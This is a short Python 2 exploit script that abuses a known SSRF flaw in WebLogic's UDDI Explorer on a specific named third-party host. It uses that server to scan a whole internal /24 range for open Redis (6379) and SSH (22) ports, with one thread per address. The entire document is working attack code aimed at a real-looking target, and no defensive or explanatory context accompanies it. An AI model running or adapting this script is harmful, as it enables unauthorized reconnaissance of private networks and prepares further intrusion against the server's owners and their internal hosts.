#!/usr/bin/env python  
# -*- coding: utf-8 -*- 
import re
import sys
import time
import thread
import requests
def scan(ip_str):
  ports = ('6379','22')
  for port in ports:
    exp_url = "http://bbs2.doone.com.cn:8003/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search"%(ip_str,port)
    try:
      response = requests.get(exp_url, timeout=15, verify=False)
      #SSRF判断
      re_sult1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',response.content)
      #丢失连接.端口连接不上
      re_sult2 = re.findall('but could not connect',response.content)
      if len(re_sult1)!=0 and len(re_sult2)==0:
        print ip_str+':'+port
    except Exception, e:
      pass
def find_ip(ip_prefix):
  '''
  给出当前的192.168.1 ，然后扫描整个段所有地址
  '''
  for i in range(1,256):
    ip = '%s.%s'%(ip_prefix,i)
    thread.start_new_thread(scan, (ip,))
    time.sleep(3)
if __name__ == "__main__":
  commandargs = sys.argv[1:]
  args = "".join(commandargs)
  ip_prefix = '.'.join(args.split('.')[:-1])
  find_ip(ip_prefix)
